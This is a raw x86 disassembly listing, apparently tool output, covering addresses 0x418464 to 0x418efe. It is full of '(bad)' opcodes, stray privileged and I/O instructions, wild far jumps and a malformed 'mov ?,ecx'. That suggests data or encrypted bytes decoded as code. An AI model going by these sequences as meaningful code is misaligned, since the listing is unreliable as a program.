  418464:	xor    DWORD PTR [ebx+0x2e462b37],ecx
  41846a:	popf   
  41846b:	fwait
  41846c:	das    
  41846d:	push   ebx
  41846e:	mov    dh,0xfd
  418470:	ret    0x5a
  418473:	jl     0x4184d3
  418475:	aas    
  418476:	loop   0x41844e
  418478:	mov    esp,0xcf705005
  41847d:	push   0xffffffa7
  41847f:	int    0xab
  418481:	jge    0x4184c6
  418483:	cmc    
  418484:	ins    DWORD PTR es:[edi],dx
  418485:	inc    edi
  418486:	inc    edx
  418487:	mov    esp,0xd3bad281
  41848c:	bound  esp,QWORD PTR [esi-0x808bda4]
  418492:	mov    ecx,0xe3a6f6ca
  418497:	add    ecx,DWORD PTR [edx-0x10]
  41849a:	test   al,0xa1
  41849c:	bound  esp,QWORD PTR [ebx-0x37]
  41849f:	mov    ecx,0xa5576d26
  4184a4:	out    dx,al
  4184a5:	and    dh,BYTE PTR [ebx+0x617f351c]
  4184ab:	add    DWORD PTR [edi],esp
  4184ad:	imul   edx,DWORD PTR [eax],0x1
  4184b0:	jns    0x418472
  4184b2:	add    ch,BYTE PTR [ebx]
  4184b4:	inc    eax
  4184b5:	shr    BYTE PTR ds:0xc85e1a7,0x79
  4184bc:	in     al,0x3f
  4184be:	jbe    0x418503
  4184c0:	pop    esp
  4184c1:	add    edx,0x10
  4184c4:	mov    ?,ecx
  4184c6:	popf   
  4184c7:	lds    edx,FWORD PTR [ecx+0x76]
  4184ca:	push   ss
  4184cb:	sub    DWORD PTR [ecx+0x63d391be],esi
  4184d1:	jae    0x4184dd
  4184d3:	in     al,dx
  4184d4:	into   
  4184d5:	inc    edx
  4184d6:	pop    ecx
  4184d7:	aam    0x67
  4184d9:	xchg   edi,eax
  4184da:	sub    eax,0x566cc92b
  4184df:	lods   al,BYTE PTR ds:[esi]
  4184e0:	push   ecx
  4184e1:	sbb    eax,0xbf16629
  4184e6:	add    BYTE PTR [edi],al
  4184e8:	(bad)  
  4184e9:	imul   DWORD PTR [ebx-0x7704580d]
  4184ef:	add    BYTE PTR [edx+esi*4],ah
  4184f2:	outs   dx,BYTE PTR ds:[esi]
  4184f3:	jmp    0x6d890450
  4184f8:	gs stc 
  4184fa:	js     0x4184d3
  4184fc:	loop   0x4184c9
  4184fe:	test   al,0x22
  418500:	out    0xf3,eax
  418502:	push   ecx
  418503:	pop    esi
  418504:	loop   0x418550
  418506:	mov    edi,DWORD PTR [ebx-0x64]
  418509:	sbb    al,0x13
  41850b:	dec    edx
  41850c:	mov    esi,0x3cd296a9
  418511:	popa   
  418512:	setae  cl
  418515:	repz push 0x40
  418518:	push   edi
  418519:	add    DWORD PTR ds:0x697ed6aa,0xc65be4d2
  418523:	daa    
  418524:	inc    ecx
  418525:	dec    edi
  418526:	lahf   
  418527:	clc    
  418528:	or     BYTE PTR [edi+0x23e4b2e3],dh
  41852e:	fld    DWORD PTR [eax-0x45056ce7]
  418534:	outs   dx,BYTE PTR ds:[esi]
  418535:	mov    esp,0xbe90cf5a
  41853a:	ds mov edi,0xa8c44182
  418540:	mov    DWORD PTR [eax],eax
	...
  4185b2:	add    BYTE PTR [eax],al
  4185b4:	test   eax,0xdf4fd367
  4185b9:	(bad)  
  4185ba:	mov    ebp,0x15c03be7
  4185bf:	stc    
  4185c0:	ror    ah,1
  4185c2:	int    0xa4
  4185c4:	cmc    
  4185c5:	or     BYTE PTR [ecx],al
  4185c7:	add    ch,dh
  4185c9:	add    BYTE PTR [eax],al
  4185cb:	add    BYTE PTR [eax+0x3f],ah
  4185ce:	mov    ebx,DWORD PTR [ecx+ebx*8+0xe]
  4185d2:	out    dx,al
  4185d3:	pminub mm4,QWORD PTR [ebx]
  4185d6:	fstp   TBYTE PTR [eax+0x16]
  4185d9:	(bad)  
  4185da:	push   ebp
  4185db:	outs   dx,DWORD PTR ds:[esi]
  4185dc:	ret    0xeb2a
  4185df:	sbb    eax,0xf0e9d51f
  4185e4:	push   0x1c53df22
  4185e9:	push   ebx
  4185ea:	or     dh,BYTE PTR [ebx+ebp*8]
  4185ed:	jg     0x4185c0
  4185ef:	icebp  
  4185f0:	test   al,0xb
  4185f2:	jmp    0x418673
  4185f4:	xchg   ebp,eax
  4185f5:	mov    eax,0xdbadc63a
  4185fa:	fstp   DWORD PTR [eax]
  4185fc:	loopne 0x4185a5
  4185fe:	add    al,BYTE PTR [ecx+0x131df154]
  418604:	pop    ds
  418605:	jecxz  0x41865e
  418607:	sub    cl,BYTE PTR [ecx*1+0x34bf2e96]
  41860e:	icebp  
  41860f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418610:	imul   esp,DWORD PTR [ebx],0x893d83e7
  418616:	dec    edi
  418617:	lods   eax,DWORD PTR ds:[esi]
  418618:	std    
  418619:	mov    al,0xc9
  41861b:	jb     0x418698
  41861d:	and    esi,DWORD PTR [edi-0x3005fbf8]
  418623:	jno    0x418699
  418625:	inc    edx
  418626:	lea    esi,[edx-0xb]
  418629:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41862a:	outs   dx,BYTE PTR ds:[esi]
  41862b:	(bad)  
  41862c:	out    0xd7,eax
  41862e:	fisttp QWORD PTR [esp+ebp*4]
  418631:	xor    eax,0x125a78eb
  418636:	test   eax,0x506b0dcd
  41863b:	xor    BYTE PTR [ebx],bh
  41863d:	fsubr  DWORD PTR [eax+0x24]
  418640:	jmp    0x33769c9
  418645:	add    esp,DWORD PTR [esi+0x1e]
  418648:	mov    bh,0x66
  41864a:	push   esi
  41864b:	lods   al,BYTE PTR ds:[esi]
  41864c:	push   esi
  41864d:	add    al,0xfb
  41864f:	xchg   ebx,eax
  418650:	fisubr WORD PTR [ebp-0x5e18dc12]
  418656:	push   ebp
  418657:	in     al,0x3f
  418659:	fs push ecx
  41865b:	pushf  
  41865c:	adc    ebp,eax
  41865e:	xor    edi,ebp
  418660:	xor    al,0x33
  418662:	es sbb eax,0x5faa3f9b
  418668:	rol    dh,1
  41866a:	fbld   TBYTE PTR [edi-0x2efa2f2a]
  418670:	jp     0x418631
  418672:	jge    0x418696
  418674:	ret    0xd233
  418677:	int    0x7
  418679:	emms   
  41867b:	(bad)  
  41867c:	and    DWORD PTR [ebx-0x1d],edi
  41867f:	in     eax,0x43
  418681:	lods   al,BYTE PTR ds:[esi]
  418682:	mov    dh,0x6e
  418684:	and    eax,ebx
  418686:	adc    BYTE PTR [ebx+0x64],al
  418689:	mov    ecx,0x72b5a84e
  41868e:	xchg   edi,eax
  41868f:	jae    0x41865a
  418691:	fisubr WORD PTR ds:0x455ed6b3
  418697:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418698:	pop    ss
  418699:	shl    DWORD PTR [edx],0x0
  41869c:	sahf   
  41869d:	(bad)  
  41869e:	jge    0x41868e
  4186a0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4186a1:	pop    DWORD PTR [ebp+0x15]
  4186a4:	pop    ebx
  4186a5:	pop    ss
  4186a6:	mov    edx,0x4ea40d5a
  4186ab:	sbb    al,0x50
  4186ad:	je     0x41868b
  4186af:	push   ss
  4186b0:	xor    ecx,DWORD PTR [edx+0x37]
  4186b3:	retf   
  4186b4:	xor    BYTE PTR [ecx-0x6d],ch
  4186b7:	mov    esp,0x662738e1
  4186bc:	test   al,0xae
  4186be:	ficom  DWORD PTR [esp+ebp*8]
	...
  418731:	add    BYTE PTR [eax],al
  418733:	add    cl,ch
  418735:	push   cs
  418736:	(bad)  
  418737:	pop    ss
  418738:	push   edi
  41873a:	jmp    0xecc1a73d
  41873f:	sub    ebx,DWORD PTR [ecx]
  418741:	mov    ah,BYTE PTR [ebx]
  418743:	adc    ebp,edx
  418745:	or     DWORD PTR [ecx],eax
  418747:	add    ch,dh
  418749:	add    BYTE PTR [eax],al
  41874b:	add    dl,cl
  41874d:	fisttp QWORD PTR [eax+0x46a4385a]
  418753:	imul   ebx,DWORD PTR [ecx],0xffffffa8
  418756:	outs   dx,DWORD PTR ds:[esi]
  418757:	rcl    DWORD PTR fs:[ebp+0x1d],0x58
  41875c:	cs iret 
  41875e:	popf   
  41875f:	mov    edx,0x9cdb0755
  418764:	jbe    0x4187de
  418766:	and    esp,ecx
  418768:	inc    eax
  418769:	in     eax,dx
  41876a:	and    edx,ebp
  41876c:	sbb    eax,0xef31e189
  418771:	stos   DWORD PTR es:[edi],eax
  418772:	pop    eax
  418773:	sub    al,0xa3
  418775:	je     0x4187ce
  418777:	or     ecx,DWORD PTR [ebp-0x1]
  41877a:	int    0x3b
  41877c:	adc    al,0x60
  41877e:	int3   
  41877f:	popa   
  418780:	push   ecx
  418781:	or     DWORD PTR [eax-0x31],eax
  418784:	stos   BYTE PTR es:[edi],al
  418785:	push   eax
  418786:	xchg   ebp,eax
  418787:	mov    al,0xea
  418789:	retf   0x7dac
  41878c:	jbe    0x4187e8
  41878e:	or     bh,BYTE PTR [edx+eiz*4-0x20ed49c8]
  418795:	loop   0x41876d
  418797:	test   BYTE PTR [eax+0xc],bh
  41879a:	mov    BYTE PTR [edi+0x30af49eb],dl
  4187a0:	push   0xffffffc7
  4187a2:	int3   
  4187a3:	cmp    bl,BYTE PTR [edi+0x43]
  4187a6:	xchg   BYTE PTR ds:0x781b840c,bh
  4187ac:	int3   
  4187ad:	push   ebx
  4187ae:	int    0x5b
  4187b0:	ror    DWORD PTR [esi],1
  4187b2:	add    al,ch
  4187b4:	(bad)  
  4187b5:	mov    ah,0x56
  4187b7:	cs push eax
  4187b9:	add    eax,0xd73bec58
  4187be:	imul   DWORD PTR [ebx]
  4187c0:	jecxz  0x418795
  4187c2:	fcmovnb st,st(6)
  4187c4:	push   ebx
  4187c5:	push   es
  4187c6:	outs   dx,DWORD PTR ds:[esi]
  4187c7:	cmp    eax,0xe6e9b441
  4187cc:	xor    edi,DWORD PTR [ecx]
  4187ce:	bound  edx,QWORD PTR [edx]
  4187d0:	mov    ds:0x9108ef12,al
  4187d5:	xor    DWORD PTR [ebp+0x3],esp
  4187d8:	mov    eax,0x7d204df9
  4187dd:	pop    ecx
  4187de:	cld    
  4187df:	jno    0x418815
  4187e1:	or     al,0xc
  4187e3:	test   BYTE PTR [edx+0x69],bl
  4187e6:	xchg   ebp,eax
  4187e7:	dec    ebp
  4187e8:	jnp    0x4187cd
  4187ea:	xlat   BYTE PTR ds:[ebx]
  4187eb:	fnstcw WORD PTR [eax+esi*8]
  4187ee:	cmp    eax,0x1bd0ada3
  4187f3:	jae    0x4187b8
  4187f5:	cmp    eax,0x56948618
  4187fa:	push   esi
  4187fb:	adc    DWORD PTR [ecx],ebp
  4187fd:	mov    ebx,0x3519fc10
  418802:	pop    ecx
  418803:	popf   
  418804:	je     0x41886e
  418806:	push   esp
  418807:	add    eax,0xdb805e96
  41880c:	rcl    DWORD PTR [esi+0xabd33b4],0x36
  418813:	cwde   
  418814:	pop    ebx
  418815:	cld    
  418816:	xchg   ebx,eax
  418817:	clc    
  418818:	sbb    ah,dl
  41881a:	push   ebp
  41881b:	jmp    0x51b4b908
  418820:	sbb    edx,ebp
  418822:	out    dx,al
  418823:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418824:	push   ebx
  418825:	adc    DWORD PTR [esi+0x49bbc99],esi
  41882b:	pop    ds
  41882c:	in     al,dx
  41882d:	in     eax,dx
  41882e:	jno    0x418838
  418830:	scas   al,BYTE PTR es:[edi]
  418831:	fild   WORD PTR [esi-0x4d6a0c94]
  418837:	sar    BYTE PTR [edx+0x71ef41d1],0xbb
  41883e:	das    
  41883f:	push   eax
  418840:	pop    edx
	...
  4188b1:	add    BYTE PTR [eax],al
  4188b3:	add    BYTE PTR [eax+0x41],bl
  4188b6:	pop    ds
  4188b7:	lods   eax,DWORD PTR ds:[esi]
  4188b8:	pop    ds
  4188b9:	(bad)  
  4188ba:	cli    
  4188bb:	cmc    
  4188bc:	inc    ebx
  4188bd:	mov    ss:0x8a82c032,al
  4188c3:	jge    0x4188a4
  4188c5:	or     al,BYTE PTR [ecx]
  4188c7:	add    ch,dh
  4188c9:	add    BYTE PTR [eax],al
  4188cb:	add    bl,ah
  4188cd:	sub    BYTE PTR [ebp-0x72d6e92],al
  4188d3:	shl    DWORD PTR [eax-0xa],0x69
  4188d7:	bound  edi,QWORD PTR [esi]
  4188d9:	dec    eax
  4188da:	cdq    
  4188db:	test   BYTE PTR [esi-0x36671577],ah
  4188e1:	leave  
  4188e2:	or     al,0x7a
  4188e4:	add    BYTE PTR [edx+ebx*8],0x26
  4188e8:	enter  0x3e66,0x4c
  4188ec:	sub    bl,bh
  4188ee:	push   ebx
  4188ef:	pop    eax
  4188f0:	push   ebp
  4188f1:	fisubr DWORD PTR [eax]
  4188f3:	inc    ebp
  4188f4:	jne    0x418923
  4188f6:	loopne 0x4188ce
  4188f8:	fild   DWORD PTR [ebp+0x4e6d3f70]
  4188fe:	test   ah,dh
  418900:	shl    DWORD PTR [edi+ebx*8],cl
  418903:	mov    edi,DWORD PTR [esi+0x5e]
  418906:	std    
  418907:	ins    BYTE PTR es:[edi],dx
  418908:	dec    esp
  418909:	add    BYTE PTR [edx],bh
  41890b:	call   0x9518:0x46284e3b
  418912:	jmp    0x4188a7
  418914:	fcomp  QWORD PTR [esi-0x7f4b8597]
  41891a:	pusha  
  41891b:	add    DWORD PTR [ebp+0x19236167],0x2f
  418922:	cmp    DWORD PTR [edi+0x62],eax
  418925:	shl    BYTE PTR [ebx],0xd4
  418928:	or     al,0x71
  41892a:	cli    
  41892b:	iret   
  41892c:	fstp   QWORD PTR [eax+ebx*4-0x6d]
  418930:	lods   al,BYTE PTR ds:[esi]
  418931:	fnstenv [eax]
  418933:	nop
  418934:	cmp    esi,0x19
  418937:	in     eax,dx
  418938:	mov    al,0x79
  41893a:	push   ebp
  41893b:	inc    edx
  41893c:	aaa    
  41893d:	add    bh,dl
  41893f:	xchg   esp,ecx
  418941:	sub    ebx,0x3e846f24
  418947:	inc    ebx
  418948:	sbb    eax,0x6322cb53
  41894d:	into   
  41894e:	cli    
  41894f:	inc    edx
  418950:	or     eax,0xee9c5c1
  418955:	sub    DWORD PTR [eax+0xde501d],ebx
  41895b:	jnp    0x4188f4
  41895d:	ret    
  41895e:	jno    0x418902
  418960:	add    BYTE PTR ds:0xe46443a6,ah
  418966:	xchg   esi,eax
  418967:	lea    edi,[edx]
  418969:	and    al,0xde
  41896b:	jecxz  0x4188fd
  41896d:	push   cs
  41896e:	jns    0x41892a
  418970:	in     eax,dx
  418971:	mov    dl,0x4f
  418973:	inc    esi
  418974:	jno    0x4189e3
  418976:	icebp  
  418977:	retf   
  418978:	outs   dx,BYTE PTR ds:[esi]
  418979:	ins    DWORD PTR es:[edi],dx
  41897a:	and    al,0x5a
  41897c:	and    esp,DWORD PTR [edx+0x78]
  41897f:	and    eax,0xe9159181
  418984:	lds    edx,FWORD PTR [edx+eax*1]
  418987:	adc    ch,BYTE PTR [ebp-0x1f]
  41898a:	add    dl,BYTE PTR [ecx]
  41898c:	dec    esi
  41898d:	in     al,0x1b
  41898f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418990:	adc    esp,DWORD PTR [edx+0x30]
  418993:	in     eax,dx
  418994:	mov    edi,DWORD PTR [ebx+0x18a47b99]
  41899a:	mov    edi,0xa6ed7e90
  41899f:	sub    BYTE PTR [edi],ch
  4189a1:	mov    ch,0x3f
  4189a3:	repz mov bl,0x2d
  4189a6:	sub    BYTE PTR [edi],ch
  4189a8:	jns    0x4189f9
  4189aa:	ret    0xb1fd
  4189ad:	pushf  
  4189ae:	outs   dx,DWORD PTR ds:[esi]
  4189af:	add    DWORD PTR [edi],ecx
  4189b1:	xor    ebx,DWORD PTR [ebp+0x2ce7f226]
  4189b7:	test   eax,0xfc102c44
  4189bc:	mov    bl,0x7d
  4189be:	popf   
  4189bf:	into   
  4189c0:	add    BYTE PTR cs:[eax],al
	...
  418a33:	add    BYTE PTR [edi],ch
  418a35:	stos   DWORD PTR es:[edi],eax
  418a36:	cdq    
  418a37:	inc    ecx
  418a38:	popf   
  418a39:	jae    0x418a3a
  418a3b:	out    dx,eax
  418a3c:	inc    esp
  418a3d:	dec    edi
  418a3e:	(bad)  
  418a3f:	clc    
  418a40:	cmc    
  418a41:	out    0x43,eax
  418a43:	pop    es
  418a44:	aam    0xb
  418a46:	add    DWORD PTR [eax],eax
  418a48:	cmc    
  418a49:	add    BYTE PTR [eax],al
  418a4b:	add    dl,dh
  418a4d:	popf   
  418a4e:	lods   al,BYTE PTR ds:[esi]
  418a4f:	stc    
  418a50:	or     esi,DWORD PTR [edi+0x68794111]
  418a56:	outs   dx,DWORD PTR ds:[esi]
  418a57:	mov    DWORD PTR [eax-0x5b],ebp
  418a5a:	sub    eax,0x780e2f64
  418a5f:	mov    ss,WORD PTR [ebx]
  418a61:	std    
  418a62:	leave  
  418a63:	add    bh,BYTE PTR [ebx]
  418a65:	or     BYTE PTR [edx+0x27],dh
  418a68:	fld    DWORD PTR [edi-0x6bd7f382]
  418a6e:	add    al,0x30
  418a70:	test   BYTE PTR [ecx+0x34d58b37],dl
  418a76:	add    al,0x64
  418a78:	pop    esp
  418a79:	xchg   DWORD PTR [ebx-0x6fc7b010],edx
  418a7f:	fild   QWORD PTR [ebx-0x20e1097f]
  418a85:	mov    ch,0xaf
  418a87:	retf   0x4ee8
  418a8a:	xor    esi,DWORD PTR [ecx]
  418a8c:	jp     0x418b0c
  418a8e:	cmc    
  418a8f:	cmc    
  418a90:	repnz add edi,edi
  418a93:	shl    edx,1
  418a95:	(bad)  
  418a96:	scas   eax,DWORD PTR es:[edi]
  418a97:	lds    edi,FWORD PTR [ebp+0x1d]
  418a9a:	fcmovnu st,st(5)
  418a9c:	icebp  
  418a9d:	adc    DWORD PTR [ebx],ebx
  418a9f:	push   ecx
  418aa0:	rol    BYTE PTR [esi],0xb1
  418aa3:	add    BYTE PTR [ebx],bl
  418aa5:	push   es
  418aa6:	pushf  
  418aa7:	leave  
  418aa8:	aaa    
  418aa9:	xor    esi,DWORD PTR ds:0xcf62a0d
  418aaf:	test   DWORD PTR [esi+ecx*1+0x60],ebx
  418ab3:	popa   
  418ab4:	stos   DWORD PTR es:[edi],eax
  418ab5:	fcomp  DWORD PTR [edi-0x30d29398]
  418abb:	jp     0x418a6c
  418abd:	clc    
  418abe:	mov    ebp,0x99a30302
  418ac3:	popa   
  418ac4:	pop    es
  418ac5:	push   0x314c9f3c
  418aca:	xchg   di,ax
  418acc:	push   esp
  418acd:	mov    bh,0x97
  418acf:	cwde   
  418ad0:	(bad)  ds:0x15b4b43f
  418ad6:	fst    QWORD PTR [edi+0x343d04cc]
  418adc:	cmp    eax,0x83ccca0b
  418ae1:	mov    dl,BYTE PTR [ecx-0x68a2c40e]
  418ae7:	cmp    eax,0xf27ef850
  418aec:	xchg   BYTE PTR [ecx-0x5d],ch
  418aef:	push   cs
  418af0:	aaa    
  418af1:	mov    ebp,edi
  418af3:	(bad)  
  418af4:	xor    esi,DWORD PTR [edx+0x76]
  418af7:	push   ss
  418af8:	mov    ch,0xae
  418afa:	inc    edi
  418afb:	pop    edi
  418afc:	enter  0xe572,0xdf
  418b00:	shr    DWORD PTR [edx],0xe0
  418b03:	mov    ch,BYTE PTR [ebx-0x5736cb5c]
  418b09:	imul   ebx,DWORD PTR [esp+edi*1-0x5f],0x8a3bbb80
  418b11:	(bad)
  418b14:	jbe    0x418ac4
  418b16:	xlat   BYTE PTR ds:[ebx]
  418b17:	lea    edx,[eax-0x4fa84ef1]
  418b1d:	int    0x6
  418b1f:	iret   
  418b20:	pop    ebx
  418b21:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418b22:	add    bh,BYTE PTR [edx+0x34]
  418b25:	test   edx,0xa063774b
  418b2b:	or     DWORD PTR [eax+ecx*8],ecx
  418b2e:	shl    ebx,1
  418b30:	aad    0x1e
  418b32:	aam    0xa5
  418b34:	xchg   edx,ebx
  418b36:	dec    eax
  418b37:	imul   esp,DWORD PTR [eax],0xffffff9a
  418b3a:	lahf   
  418b3b:	lods   al,BYTE PTR ds:[esi]
  418b3c:	mov    esi,0xc585ac56
	...
  418bb1:	add    BYTE PTR [eax],al
  418bb3:	add    BYTE PTR [ecx-0x267b6f40],cl
  418bb9:	aam    0x9d
  418bbb:	int    0x19
  418bbd:	xchg   edx,eax
  418bbe:	clc    
  418bbf:	(bad)  
  418bc0:	ds test edx,esp
  418bc3:	js     0x418b8e
  418bc5:	or     al,0x1
  418bc7:	add    ch,dh
  418bc9:	add    BYTE PTR [eax],al
  418bcb:	add    BYTE PTR [eax+edx*2+0x23],ch
  418bcf:	scas   al,BYTE PTR es:[edi]
  418bd0:	daa    
  418bd1:	rol    BYTE PTR [eax+0x5c],0x13
  418bd5:	in     al,dx
  418bd6:	adc    eax,0xe1d59d69
  418bdb:	ins    DWORD PTR es:[edi],dx
  418bdc:	gs mov edx,0x79d17d5f
  418be2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418be3:	push   cs
  418be4:	or     cl,ch
  418be6:	rcl    DWORD PTR [ebp-0x56],cl
  418be9:	ror    al,0x47
  418bec:	push   edi
  418bed:	dec    esi
  418bee:	dec    esp
  418bef:	mov    ds:0xbd115636,al
  418bf4:	fcomp  QWORD PTR [edi-0x78cfc779]
  418bfa:	imul   ecx,edx,0xffffff94
  418bfd:	dec    edi
  418bfe:	or     ebp,edx
  418c00:	pop    esp
  418c01:	pop    ebx
  418c02:	pop    edi
  418c03:	lods   al,BYTE PTR ds:[esi]
  418c04:	test   al,0xcd
  418c06:	cmp    DWORD PTR [ebp+0x2b32de5],esp
  418c0c:	push   ss
  418c0d:	adc    edx,DWORD PTR [edi+0x3da85cbe]
  418c13:	xchg   edx,eax
  418c14:	dec    esi
  418c15:	sub    al,0xce
  418c17:	stc    
  418c18:	xchg   ecx,eax
  418c19:	push   ecx
  418c1a:	fdiv   DWORD PTR [eax+edi*1-0x3a]
  418c1e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418c1f:	retf   
  418c20:	outs   dx,DWORD PTR ds:[esi]
  418c21:	mov    ds:0xe6dd093a,al
  418c26:	ja     0x418be4
  418c28:	or     DWORD PTR [esi+0x15f47783],edi
  418c2e:	shl    BYTE PTR [ecx],0x4
  418c31:	sbb    bl,BYTE PTR [eax]
  418c33:	int    0x57
  418c35:	xchg   ecx,eax
  418c36:	xchg   esp,eax
  418c37:	or     eax,0x5d129b34
  418c3c:	outs   dx,DWORD PTR ds:[esi]
  418c3d:	xchg   esi,eax
  418c3e:	mov    eax,0x94752c77
  418c43:	int    0x4a
  418c45:	sub    DWORD PTR [ebx+0x25],esi
  418c48:	pop    edx
  418c49:	(bad)  
  418c4a:	cmp    al,0xa0
  418c4c:	mov    DWORD PTR [ecx+0x413dba21],esp
  418c52:	dec    esi
  418c53:	and    ch,BYTE PTR [esi]
  418c55:	mov    al,ds:0x6484253c
  418c5a:	mov    ch,0x21
  418c5c:	pop    ebp
  418c5d:	xor    BYTE PTR [eax-0x45],cl
  418c60:	lahf   
  418c61:	jns    0x418bfa
  418c63:	mov    edx,esp
  418c65:	popa   
  418c66:	shr    BYTE PTR [eax-0x76],0x9f
  418c6a:	xor    ebx,DWORD PTR [edx]
  418c6c:	cs in  eax,dx
  418c6e:	jnp    0x418c02
  418c70:	mov    al,ds:0x793a0366
  418c75:	mov    eax,ds:0x427ebf9b
  418c7a:	and    ecx,edx
  418c7c:	mov    ecx,0xb890bec6
  418c81:	cmp    BYTE PTR [edx+esi*1+0x5a],cl
  418c85:	fimul  WORD PTR [eax-0x15]
  418c88:	iret   
  418c89:	xchg   ebx,eax
  418c8a:	sbb    DWORD PTR [edx+0x2d],esi
  418c8d:	scas   eax,DWORD PTR es:[edi]
  418c8e:	and    eax,0x1c9ccaa
  418c93:	push   eax
  418c94:	adc    al,0xf0
  418c96:	rol    BYTE PTR [edi+0x78],cl
  418c99:	lock cmp DWORD PTR [edx-0x57],edx
  418c9d:	sub    DWORD PTR [ebx+0x5],edx
  418ca0:	or     bl,BYTE PTR [edx]
  418ca2:	js     0x418c79
  418ca4:	call   0x4cc218b1
  418ca9:	or     DWORD PTR [edi],eax
  418cab:	daa    
  418cac:	cmp    dh,BYTE PTR [eax]
  418cae:	hlt    
  418caf:	dec    edx
  418cb0:	rol    DWORD PTR [edx+0x69],cl
  418cb3:	out    0xdd,eax
  418cb5:	gs scas eax,DWORD PTR es:[edi]
  418cb7:	mov    ecx,DWORD PTR [edi-0x23]
  418cba:	add    al,0x29
  418cbc:	int    0x8a
  418cbe:	mov    ds:0x5804,al
	...
  418d33:	add    BYTE PTR [edi],dl
  418d35:	arpl   WORD PTR ds:0x5f7f7d53,bx
  418d3b:	addr16 in eax,dx
  418d3d:	inc    eax
  418d3e:	jmp    0x9644a861
  418d43:	into   
  418d44:	mov    esi,0xf500010d
  418d49:	add    BYTE PTR [eax],al
  418d4b:	add    BYTE PTR [ebx-0x118fc3cb],al
  418d51:	push   0x2a47e8a1
  418d56:	push   esp
  418d57:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418d58:	xchg   ebx,eax
  418d59:	nop
  418d5a:	adc    eax,0xb032db7a
  418d5f:	icebp  
  418d60:	mov    eax,ds:0x7438ff6d
  418d65:	jbe    0x418dcf
  418d67:	fidiv  DWORD PTR [edi+0x5236b779]
  418d6d:	cmp    eax,0x1ffaced2
  418d72:	cdq    
  418d73:	adc    al,0xc8
  418d75:	sbb    esi,DWORD PTR [ebp-0x3be49a4c]
  418d7b:	sbb    al,0x8d
  418d7d:	adc    edi,DWORD PTR [edi+edx*8-0x73]
  418d81:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418d82:	mov    edi,0x639047d9
  418d87:	pushf  
  418d88:	push   edi
  418d89:	ins    BYTE PTR es:[edi],dx
  418d8a:	dec    ebx
  418d8b:	stos   BYTE PTR es:[edi],al
  418d8c:	aam    0xcd
  418d8e:	out    0xf3,eax
  418d90:	inc    esp
  418d91:	neg    BYTE PTR [ebp+ecx*1-0x19698d75]
  418d98:	jne    0x418e02
  418d9a:	cs jecxz 0x418db2
  418d9d:	mov    edx,0xed642988
  418da2:	pop    esp
  418da3:	repz mov bh,0x6c
  418da6:	imul   esp,DWORD PTR [edi-0x42],0x75b0d39f
  418dad:	push   esi
  418dae:	aaa    
  418daf:	aam    0xf9
  418db1:	or     al,0x92
  418db3:	xor    eax,0x52f78260
  418db8:	jnp    0x418dd6
  418dba:	arpl   WORD PTR [ebp+0x5d83e849],di
  418dc0:	xlat   BYTE PTR ds:[ebx]
  418dc1:	mov    ch,0x7c
  418dc3:	dec    eax
  418dc4:	jl     0x418dfd
  418dc6:	(bad)  
  418dc7:	sub    al,0x59
  418dc9:	repz mov edi,DWORD PTR [ebp-0x42b06a71]
  418dd0:	xchg   edi,eax
  418dd2:	stc    
  418dd3:	add    ch,bl
  418dd5:	pop    ebx
  418dd6:	imul   eax,DWORD PTR gs:[edx-0x3aab8b62],0xffffff83
  418dde:	jmp    0xdd0c:0x7d237527
  418de5:	sahf   
  418de6:	and    ecx,0x882e617
  418dec:	push   es
  418ded:	push   eax
  418dee:	test   BYTE PTR [eax-0x52],ch
  418df1:	jp     0x418e64
  418df3:	inc    ebp
  418df4:	mov    esp,0xfcb667a7
  418df9:	mov    al,ds:0x661b1650
  418dfe:	das    
  418dff:	push   0x1d159c2
  418e04:	jo     0x418e16
  418e06:	int3   
  418e07:	and    al,0xab
  418e09:	add    al,0x4b
  418e0b:	scas   eax,DWORD PTR es:[edi]
  418e0c:	pop    edi
  418e0d:	and    dl,0x3e
  418e10:	or     ebp,DWORD PTR [ebx]
  418e12:	sub    ecx,ebx
  418e14:	int    0x14
  418e16:	adc    al,BYTE PTR [eax]
  418e18:	mov    ds:0x1b3b7d9,al
  418e1d:	sub    cl,BYTE PTR [edx]
  418e1f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418e20:	fisttp DWORD PTR [edi]
  418e22:	test   cl,bl
  418e24:	fcom   DWORD PTR [edi+edx*2]
  418e27:	mov    bl,0xee
  418e29:	jne    0x418dd7
  418e2b:	xchg   DWORD PTR [edi+eax*8+0x4c],ecx
  418e2f:	dec    edx
  418e30:	cdq    
  418e31:	test   eax,0xd741e33e
  418e36:	push   edi
  418e37:	(bad)  [ebx+0x4e6029cd]
  418e3d:	aas    
  418e3e:	jl     0x418dc2
	...
  418eb4:	(bad)  
  418eb5:	out    0xe6,al
  418eb7:	cmp    esp,esi
  418eb9:	cmp    edi,edi
  418ebb:	push   DWORD PTR [eax-0x20]
  418ebe:	jecxz  0x418eb9
  418ec0:	inc    edi
  418ec1:	fdivr  QWORD PTR [eax]
  418ec3:	mov    ah,0xb3
  418ec5:	push   cs
  418ec6:	add    DWORD PTR [eax],eax
  418ec8:	cmc    
  418ec9:	add    BYTE PTR [eax],al
  418ecb:	add    BYTE PTR [esi+esi*4+0x2a],cl
  418ecf:	cli    
  418ed0:	sbb    eax,0x5e691218
  418ed5:	mov    dl,0xe7
  418ed7:	(bad)  
  418ed8:	div    DWORD PTR [ebx+0x75229da2]
  418ede:	call   0xa858:0x88381597
  418ee5:	lods   eax,DWORD PTR ds:[esi]
  418ee6:	xor    DWORD PTR [esi],ecx
  418ee8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418ee9:	dec    BYTE PTR [eax+0x3c]
  418eec:	popa   
  418eed:	push   esp
  418eee:	inc    ebx
  418eef:	mov    bl,0xb2
  418ef1:	inc    esi
  418ef2:	sub    DWORD PTR [edx],ebp
  418ef4:	cs jmp 0xf9ac:0x2945991b
  418efc:	xchg   esi,eax
  418efd:	inc    ebx
  418efe:	adc    eax,ebx
